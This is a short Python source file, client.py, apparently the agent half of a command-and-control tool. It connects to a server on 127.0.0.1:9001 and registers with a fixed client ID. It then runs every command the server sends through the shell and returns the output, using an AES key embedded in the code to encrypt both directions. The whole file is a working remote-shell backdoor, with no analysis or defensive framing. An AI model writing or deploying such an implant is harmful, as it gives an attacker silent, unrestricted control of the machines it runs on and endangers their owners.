# client.py
import socket, json, subprocess
from aes_util import encrypt, decrypt
CLIENT_ID = "3ad84786-8633-4471-9934-027f7a5f1d3b"
SHARED_KEY = "R7o/rYTFDrIXLbqV231tOHtdg91jU/v2u5nxK+IMq9U="

s = socket.socket()
s.connect(("127.0.0.1", 9001))
s.send(json.dumps({"id": CLIENT_ID}).encode())

while True:
    data = json.loads(s.recv(4096).decode())
    cmd = decrypt(data['payload'], SHARED_KEY)
    output = subprocess.getoutput(cmd)
    enc_output = encrypt(output, SHARED_KEY)
    s.send(enc_output.encode())
